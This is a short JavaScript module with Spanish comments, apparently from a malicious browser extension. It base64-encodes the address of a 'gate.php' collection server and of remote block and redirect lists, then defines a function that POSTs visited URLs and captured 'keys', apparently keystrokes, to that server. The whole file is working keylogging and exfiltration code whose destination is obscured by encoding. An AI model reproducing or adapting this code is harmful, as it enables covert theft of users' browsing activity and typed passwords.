//Url del fichero de sitio a bloquear codificada en base64-----------------
export var codeFs = "aHR0cDovLzE5Mi4xNjguMS40Mi9maWNoZXJvMy50eHQ="

//Url del fichero de sitio para redireccionar codificada en base64---------
export var codeFr = "aHR0cDovLzE5Mi4xNjguMS40Mi9maWNoZXJvNC50eHQ="

//Funcion de envio de datos al servidor------------------------------------
export function sendData(data, mode) {
	//Url del servidor codificada en base64
	var codeSvr = "aHR0cDovLzE5Mi4xNjguMS40Mi9nYXRlLnBocA==" 
	//Decodificamos la URL que vamos a solicitar via Ajax
	var SRV = atob (codeSvr)
	var ajaxReq = new XMLHttpRequest();
	ajaxReq.open("POST", SRV, true);
	ajaxReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	if (mode == 0){
		ajaxReq.send("url=" + btoa(data));
		console.log ('aqui llega urls' + data);
	}else if (mode == 1){
		ajaxReq.send("key=" + btoa(data));
		console.log ('aqui llega keys' + data);
	} 
	ajaxReq.onreadystatechange = function (){
		if (ajaxReq.readyState == 4 && ajaxReq.status == 200){
			console.log (ajaxReq.responseText);
		}
	}
}